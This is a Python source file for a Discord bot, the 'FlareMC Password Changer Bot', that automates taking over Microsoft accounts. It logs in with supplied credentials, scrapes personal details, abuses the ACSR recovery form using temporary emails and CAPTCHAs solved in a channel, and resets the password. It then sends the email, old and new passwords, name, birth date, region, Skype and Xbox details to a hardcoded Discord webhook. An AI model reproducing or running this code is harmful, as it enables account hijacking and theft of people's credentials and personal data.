import sys
import os

# Make automation package importable (works on Windows, Linux, Render, VPS)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
automation_path = os.path.join(BASE_DIR, "automation")
if os.path.isdir(automation_path):
    sys.path.insert(0, BASE_DIR)  # so "from automation.xxx" works
else:
    sys.path.insert(0, BASE_DIR)
    print("⚠️ automation/ folder not found next to main.py")

import discord
from discord.ext import commands, tasks
from discord import app_commands
import asyncio
import json
from datetime import datetime, timedelta
import random
from io import BytesIO
from PIL import Image
import traceback
import time
from typing import Optional

# Ignore This ->
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_DIR = os.path.join(BASE_DIR, "data")

os.makedirs(DATA_DIR, exist_ok=True)

# Import automation modules - NO TRY/EXCEPT, let it crash if fails
from automation.core import scrape_account_info
from automation.acsr import submit_acsr_form
from automation.acsr_continue import continue_acsr_flow
from automation.reset_password import perform_password_reset
from automation.captcha import download_captcha
import tempmail

# ==================== CONFIGURATION ====================
ADMIN_IDS = 1350376694141419581
CONFIG_FILE = "config.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
ACTIVE_SESSIONS_FILE = "active_sessions.json"
STATS_FILE = "bot_stats.json"

# Colors
COLOR_PRIMARY = 0x7B2CBF
COLOR_SUCCESS = 0x10B981
COLOR_ERROR = 0xEF4444
COLOR_WARNING = 0xF59E0B
COLOR_INFO = 0x3B82F6


# ==================== DATA MANAGER ====================
class BotDataManager:

    def __init__(self):
        self.config = self.load_json(
            CONFIG_FILE, {
                "webhook_url":
                "https://discord.com/api/webhooks/1555522180341698641/gsHW1n1JDEk2Urrd8WiXnoXNDDcBBsv21MPPGGBnpX-Vv5MKUN3_OkNrwCTlf18tEj7K",
                "bot_enabled": True,
                "max_concurrent_users": 100,
                "captcha_channel_id": 1488093676604227685
            })

        self.authorized_users = self.load_json(
            AUTHORIZED_USERS_FILE, {
                str(ADMIN_IDS): {
                    "authorized": True,
                    "added_by": "system",
                    "added_at": str(datetime.now())
                }
            })

        self.active_sessions = {}
        self.otp_data = {}
        self.processing_sessions = {}
        self.stats = self.load_json(
            STATS_FILE, {
                "total_processed": 0,
                "total_success": 0,
                "total_failed": 0,
                "users_served": {}
            })

    def load_json(self, filename, default):
        if os.path.exists(filename):
            try:
                with open(filename, 'r') as f:
                    return json.load(f)
            except:
                pass
        return default

    def save_json(self, filename, data):
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

    def save_config(self):
        self.save_json(CONFIG_FILE, self.config)

    def save_authorized_users(self):
        self.save_json(AUTHORIZED_USERS_FILE, self.authorized_users)

    def save_stats(self):
        self.save_json(STATS_FILE, self.stats)

    def is_authorized(self, user_id):
        return str(user_id) in self.authorized_users and self.authorized_users[
            str(user_id)]["authorized"]

    def authorize_user(self, user_id, by_admin, expires_at=None):
        self.authorized_users[str(user_id)] = {
            "authorized": True,
            "added_by": str(by_admin),
            "added_at": str(datetime.now()),
            "expires_at": expires_at
        }
        self.save_authorized_users()

    def revoke_user(self, user_id):
        if str(user_id) in self.authorized_users:
            del self.authorized_users[str(user_id)]
            self.save_authorized_users()

    def generate_otp(self, user_id):
        otp = ''.join([str(random.randint(0, 9)) for _ in range(6)])
        self.otp_data[user_id] = {
            "otp": otp,
            "expires": datetime.now() + timedelta(minutes=5),
            "attempts": 0
        }
        return otp

    def verify_otp(self, user_id, otp):
        if user_id not in self.otp_data:
            return False, "No OTP requested. Use `/request_otp` first."

        data = self.otp_data[user_id]

        if datetime.now() > data["expires"]:
            del self.otp_data[user_id]
            return False, "OTP expired. Request a new one."

        if data["attempts"] >= 3:
            del self.otp_data[user_id]
            return False, "Maximum attempts exceeded."

        if data["otp"] == otp:
            del self.otp_data[user_id]
            self.active_sessions[user_id] = {
                "authenticated": True,
                "auth_time": datetime.now()
            }
            return True, "Authentication successful!"
        else:
            data["attempts"] += 1
            return False, f"Invalid OTP. {3 - data['attempts']} attempts remaining."

    def is_authenticated(self, user_id):
        if user_id not in self.active_sessions:
            return False

        session = self.active_sessions[user_id]
        auth_time = session.get("auth_time")

        if isinstance(auth_time, str):
            auth_time = datetime.fromisoformat(auth_time)

        # Session expires after 24 hours
        if datetime.now() - auth_time > timedelta(hours=24):
            del self.active_sessions[user_id]
            return False

        return True

    def logout(self, user_id):
        if user_id in self.active_sessions:
            del self.active_sessions[user_id]

    def update_stats(self, user_id, success):
        self.stats["total_processed"] += 1
        if success:
            self.stats["total_success"] += 1
        else:
            self.stats["total_failed"] += 1

        user_str = str(user_id)
        if user_str not in self.stats["users_served"]:
            self.stats["users_served"][user_str] = {
                "processed": 0,
                "success": 0
            }

        self.stats["users_served"][user_str]["processed"] += 1
        if success:
            self.stats["users_served"][user_str]["success"] += 1

        self.save_stats()


# PASSWORD GENERATOR
def generate_flare_password():
    """Generate Flare Drops password format (Fallback if needed)"""
    random_numbers = ''.join([str(random.randint(0, 9)) for _ in range(6)])
    return f"Flare{random_numbers}"


# BOT SETUP
intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
data_manager = BotDataManager()


# HELPER FUNCTIONS
def create_embed(title, description, color, fields=None):
    embed = discord.Embed(title=title,
                          description=description,
                          color=color,
                          timestamp=datetime.now())

    if fields:
        for field in fields:
            embed.add_field(name=field.get("name", "Field"),
                            value=field.get("value", "No value"),
                            inline=field.get("inline", False))

    embed.set_footer(text="FlareMC Password Changer Bot • !                Abu Farhan")
    return embed


async def send_to_webhook(result):
    """Send results to Discord webhook"""
    webhook_url = data_manager.config.get("webhook_url")
    if not webhook_url:
        print("⚠️ No webhook URL configured")
        return

    webhook_data = {
        "embeds": [{
            "title":
            "<:password_recovery40:1467913845262778421> Password Changed Successfully",
            "color":
            COLOR_SUCCESS,
            "fields": [{
                "name": "<:Icon_Mail:1469702058868211815> Email",
                "value": f"`{result['email']}`",
                "inline": False
            }, {
                "name": "<:password:1469702059904467057> Old Password",
                "value": f"`{result['old_password']}`",
                "inline": True
            }, {
                "name": "<:password:1469702059904467057> New Password",
                "value": f"`{result['newpass']}`",
                "inline": True
            }, {
                "name": "<:name:1469702060705583359> Name",
                "value": result.get('name', 'N/A'),
                "inline": True
            }, {
                "name": "📅 DOB",
                "value": result.get('dob', 'N/A'),
                "inline": True
            }, {
                "name": "<:world:1469702063226224683> Region",
                "value": result.get('region', 'N/A'),
                "inline": True
            }, {
                "name": "<:skype:1469702061376405544> Skype ID",
                "value": result.get('skype_id', 'N/A'),
                "inline": True
            }, {
                "name": "<:skype:1469702061376405544> Skype Email",
                "value": result.get('skype_email', 'N/A'),
                "inline": True
            }, {
                "name": "<a:xbox:1469702061875527866> Xbox Gamertag",
                "value": result.get('gamertag', 'N/A'),
                "inline": True
            }],
            "footer": {
                "text":
                f"Processed by User ID: {result.get('user_id', 'Unknown')}"
            },
            "timestamp":
            datetime.now().isoformat()
        }]
    }

    import aiohttp
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(webhook_url, json=webhook_data) as resp:
                if resp.status == 204:
                    print(f"✅ Webhook sent for {result['email']}")
                else:
                    print(f"⚠️ Webhook failed: {resp.status}")
    except Exception as e:
        print(f"❌ Webhook error: {e}")


# ACCOUNT PROCESSING
async def process_account_full(email, password, user_id, channel, newpass):
    """Complete account processing with all steps"""
    try:
        # Step 1: Scrape account info
        if channel:
            await channel.send(embed=create_embed(
                "<:Accounts:1469720768668766208> Step 1/5: Scraping Account Info",
                f"Logging into `{email}` to gather account details...",
                COLOR_INFO))

        print(f"\n{'='*60}")
        print(f"Processing: {email}")
        print(f"User ID: {user_id}")
        print(f"{'='*60}\n")

        # Run in executor to avoid blocking
        loop = asyncio.get_event_loop()
        account_info = await loop.run_in_executor(None, scrape_account_info,
                                                  email, password)

        if not account_info or account_info.get("error"):
            error_msg = account_info.get(
                "error",
                "Could not login") if account_info else "Could not login"
            if channel:
                await channel.send(embed=create_embed(
                    "❌ Login Failed",
                    f"**Error:** {error_msg}\n**Account:** `{email}`",
                    COLOR_ERROR))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": error_msg}

        print(f"✅ Account info scraped successfully")

        # Step 2: Submit ACSR form
        if channel:
            await channel.send(embed=create_embed(
                "<:Microsoft:1466088532178243751> Step 2/5: Submitting ACSR Form",
                f"✅ Scraped: **{account_info.get('name', 'Unknown')}**\n\nGenerating temp email and submitting recovery form...",
                COLOR_INFO))

        captcha_image, driver, token, temp_email = await loop.run_in_executor(
            None, submit_acsr_form, account_info)

        if not captcha_image or not driver:
            if channel:
                await channel.send(embed=create_embed(
                    "❌ ACSR Submission Failed",
                    "Could not submit the ACSR form.", COLOR_ERROR))
            data_manager.update_stats(user_id, False)
            return {"status": "failed", "error": "ACSR submission failed"}

        print(f"✅ ACSR form submitted, temp email: {temp_email}")

        # Step 3: Send CAPTCHA
        captcha_filename = os.path.join(
            DATA_DIR, f"captcha_{user_id}_{int(time.time())}.png")
        captcha_image.seek(0)
        with open(captcha_filename, "wb") as f:
            f.write(captcha_image.read())

        # STORE DATA INCLUDING THE CUSTOM PASSWORD
        data_manager.processing_sessions[user_id] = {
            "driver": driver,
            "token": token,
            "temp_email": temp_email,
            "account_info": account_info,
            "email": email,
            "password": password,
            "desired_password": newpass,
            "captcha_file": captcha_filename,
            "captcha_attempts": 0,
            "channel_id": channel.id,
            "start_time": datetime.now(),
            "waiting_for_captcha": True
        }

        # Send to specific channel if configured, otherwise use current channel
        target_channel_id = data_manager.config.get("captcha_channel_id")
        target_channel = bot.get_channel(
            int(target_channel_id)) if target_channel_id else channel

        if target_channel:
            await target_channel.send(embed=create_embed(
                "<:captcha:1469721591196680275> CAPTCHA Required | Attempt: 1",
                "Please solve the CAPTCHA shown above:\n\n**Instructions**\n• Look at the image below\n• Type the characters you see\n• You have 5 minutes to respond",
                COLOR_WARNING),
                                      file=discord.File(captcha_filename))

        print(f"⏳ Waiting for CAPTCHA solution in channel...")
        return {"status": "captcha_pending"}

    except Exception as e:
        print(f"❌ Error in process_account_full: {str(e)}")
        traceback.print_exc()

        if channel:
            await channel.send(embed=create_embed(
                "❌ Processing Error", f"**Error:** {str(e)}", COLOR_ERROR))
        data_manager.update_stats(user_id, False)
        return {"status": "failed", "error": str(e)}


async def continue_after_captcha(user_id, captcha_text, interaction):
    """Continue processing after CAPTCHA submission"""
    if user_id not in data_manager.processing_sessions:
        await interaction.response.send_message(embed=create_embed(
            "❌ No Session", "No active CAPTCHA session found.", COLOR_ERROR),
                                                ephemeral=True)
        return

    session = data_manager.processing_sessions[user_id]
    driver = session["driver"]
    token = session["token"]
    account_info = session["account_info"]
    email = session["email"]
    password = session["password"]
    desired_password = session.get("desired_password")  # Retrieve custom password

    channel = bot.get_channel(session["channel_id"])

    try:
        await interaction.response.defer(ephemeral=True)

        # Step 4: Continue ACSR
        await channel.send(embed=create_embed(
            "<:Microsoft:1466088532178243751> Step 4/5: Continuing ACSR Flow",
            "Submitting CAPTCHA and waiting for OTP from temp email...",
            COLOR_INFO))

        print(f"\n🔐 Submitting CAPTCHA: {captcha_text}")

        loop = asyncio.get_event_loop()
        reset_link = await loop.run_in_executor(None, continue_acsr_flow,
                                                driver, account_info, token,
                                                captcha_text)

        # Handle CAPTCHA retry
        if reset_link == "CAPTCHA_RETRY_NEEDED":
            session["captcha_attempts"] += 1

            if session["captcha_attempts"] >= 3:
                await channel.send(embed=create_embed(
                    "❌ Maximum CAPTCHA Attempts",
                    "You've used all 3 attempts. Please start over with `/process`.",
                    COLOR_ERROR))
                await interaction.followup.send(embed=create_embed(
                    "❌ Failed", "Max CAPTCHA attempts reached.", COLOR_ERROR),
                                                ephemeral=True)

                driver.quit()
                if os.path.exists(session["captcha_file"]):
                    os.remove(session["captcha_file"])
                del data_manager.processing_sessions[user_id]
                data_manager.update_stats(user_id, False)
                return

            # Get new CAPTCHA
            print(f"❌ CAPTCHA incorrect, downloading new one...")
            new_captcha = await loop.run_in_executor(None, download_captcha,
                                                     driver)
            new_captcha_filename = f"captcha_{user_id}_{int(datetime.now().timestamp())}.png"
            new_captcha.seek(0)
            with open(new_captcha_filename, "wb") as f:
                f.write(new_captcha.read())

            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            session["captcha_file"] = new_captcha_filename

            await channel.send(embed=create_embed(
                "❌ Wrong CAPTCHA",
                f"Attempts remaining: **{3 - session['captcha_attempts']}**\n\nPlease try again.",
                COLOR_WARNING),
                               file=discord.File(new_captcha_filename))
            await interaction.followup.send(embed=create_embed(
                "❌ Try Again", "CAPTCHA was incorrect.", COLOR_WARNING),
                                            ephemeral=True)
            return

        if not reset_link or reset_link.startswith("ERROR"):
            await channel.send(embed=create_embed(
                "❌ ACSR Failed", f"Could not complete recovery: {reset_link}",
                COLOR_ERROR))
            await interaction.followup.send(embed=create_embed(
                "❌ Failed", f"ACSR error: {reset_link}", COLOR_ERROR),
                                            ephemeral=True)

            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        print(f"✅ Reset link received")

        # Step 5: Reset password
        await channel.send(embed=create_embed(
            "<:password:1469702059904467057> Step 5/5: Resetting Password",
            f"Opening reset link and changing password to **{desired_password}**...",
            COLOR_INFO))

        # Use custom password here
        print(f"🔑 Setting password to: {desired_password}")

        actual_password = await loop.run_in_executor(None,
                                                     perform_password_reset,
                                                     reset_link, email,
                                                     desired_password)

        if not actual_password:
            await channel.send(embed=create_embed(
                "❌ Password Reset Failed",
                "Could not change the password. Please try again.",
                COLOR_ERROR))
            await interaction.followup.send(embed=create_embed(
                "❌ Failed", "Password reset failed.", COLOR_ERROR),
                                            ephemeral=True)

            driver.quit()
            if os.path.exists(session["captcha_file"]):
                os.remove(session["captcha_file"])
            del data_manager.processing_sessions[user_id]
            data_manager.update_stats(user_id, False)
            return

        print(f"✅ Password changed successfully to: {actual_password}")

        # ========== FIXED RESULT DICTIONARY ==========
        result = {
            "email": email,
            "old_password": password,
            "newpass": actual_password,
            "name": account_info.get("name", "N/A"),
            "dob": account_info.get("dob", "N/A"),
            "region": account_info.get("region", "N/A"),
            "skype_id": account_info.get("skype_id", "N/A"),
            "skype_email": account_info.get("skype_email", "N/A"),
            "gamertag": account_info.get("gamertag", "N/A"),
            "user_id": user_id
        }

        # Send to webhook
        await send_to_webhook(result)

        # Success message to channel
        await channel.send(embed=create_embed(
            "✅ Password Changed Successfully!",
            f"**Email:** `{email}`\n"
            f"**New Password:** `{actual_password}`\n\n"
            f"Account details have been sent to the webhook.",
            COLOR_SUCCESS))

        await interaction.followup.send(embed=create_embed(
            "✅ Success",
            f"Password for `{email}` has been changed to `{actual_password}`.",
            COLOR_SUCCESS),
                                        ephemeral=True)

        # Cleanup
        try:
            driver.quit()
        except:
            pass
        if os.path.exists(session["captcha_file"]):
            os.remove(session["captcha_file"])
        del data_manager.processing_sessions[user_id]
        data_manager.update_stats(user_id, True)

    except Exception as e:
        print(f"❌ Error in continue_after_captcha: {str(e)}")
        traceback.print_exc()

        try:
            await channel.send(embed=create_embed(
                "❌ Processing Error", f"**Error:** {str(e)}", COLOR_ERROR))
            await interaction.followup.send(embed=create_embed(
                "❌ Failed", f"Unexpected error: {str(e)}", COLOR_ERROR),
                                            ephemeral=True)
        except:
            pass

        try:
            driver.quit()
        except:
            pass
        if os.path.exists(session.get("captcha_file", "")):
            try:
                os.remove(session["captcha_file"])
            except:
                pass
        if user_id in data_manager.processing_sessions:
            del data_manager.processing_sessions[user_id]
        data_manager.update_stats(user_id, False)


# ==================== BOT EVENTS & COMMANDS ====================
# NOTE: The original file was truncated. 
# You still need to add your slash commands, on_ready, captcha listener, and bot.run()
# Below is a minimal placeholder so the file at least parses.

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user} (ID: {bot.user.id})")
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")


# Placeholder - replace with your real commands
@bot.tree.command(name="ping", description="Check if bot is alive")
async def ping(interaction: discord.Interaction):
    await interaction.response.send_message("Pong!", ephemeral=True)


# Run the bot
# Make sure you have DISCORD_TOKEN in environment variables on Render
if __name__ == "__main__":
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("❌ DISCORD_TOKEN environment variable is not set!")
        sys.exit(1)
    bot.run(token)
